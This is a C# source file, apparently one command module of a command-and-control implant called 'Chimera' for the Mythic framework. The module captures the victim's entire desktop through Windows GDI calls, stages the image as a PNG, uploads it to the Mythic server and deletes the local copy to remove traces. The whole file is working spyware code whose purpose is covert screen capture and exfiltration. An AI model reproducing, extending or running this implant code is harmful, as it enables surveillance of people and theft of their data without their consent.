using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;

namespace Chimera.Commands
{
    public static class Screenshot
    {
        [DllImport("user32.dll")] static extern IntPtr GetDesktopWindow();
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("gdi32.dll")]  static extern int GetDeviceCaps(IntPtr hDC, int nIndex);
        [DllImport("gdi32.dll")]  static extern bool BitBlt(
            IntPtr hdcDest, int xDest, int yDest, int width, int height,
            IntPtr hdcSrc,  int xSrc,  int ySrc,  uint dwRop);
        [DllImport("gdi32.dll")]  static extern IntPtr CreateCompatibleDC(IntPtr hDC);
        [DllImport("gdi32.dll")]  static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int w, int h);
        [DllImport("gdi32.dll")]  static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObj);
        [DllImport("gdi32.dll")]  static extern bool DeleteDC(IntPtr hDC);
        [DllImport("gdi32.dll")]  static extern bool DeleteObject(IntPtr hObj);

        private const int HORZRES = 8, VERTRES = 10;
        private const uint SRCCOPY = 0x00CC0020;

        public static string Execute(string taskID, string callbackUUID)
        {
            string outPath = Path.Combine(Staging.Dir, "screenshot.png");
            try
            {
                IntPtr desktop = GetDesktopWindow();
                IntPtr hdcSrc  = GetDC(desktop);
                int w = GetDeviceCaps(hdcSrc, HORZRES);
                int h = GetDeviceCaps(hdcSrc, VERTRES);

                IntPtr hdcDest = CreateCompatibleDC(hdcSrc);
                IntPtr hBmp    = CreateCompatibleBitmap(hdcSrc, w, h);
                IntPtr hOld    = SelectObject(hdcDest, hBmp);

                BitBlt(hdcDest, 0, 0, w, h, hdcSrc, 0, 0, SRCCOPY);
                SelectObject(hdcDest, hOld);

                // Save via GDI+ through managed Bitmap
                var bmp = Image.FromHbitmap(hBmp);
                Staging.EnsureDir();
                bmp.Save(outPath, ImageFormat.Png);
                bmp.Dispose();

                DeleteDC(hdcDest);
                DeleteObject(hBmp);
                ReleaseDC(desktop, hdcSrc);

                // Upload to Mythic
                string result = Upload.Execute(outPath + " screenshot.png", taskID, callbackUUID);
                try { File.Delete(outPath); } catch { }
                return "[+] Screenshot captured and uploaded.\n" + result;
            }
            catch (Exception ex)
            {
                return "[error] screenshot: " + ex.Message;
            }
        }
    }
}
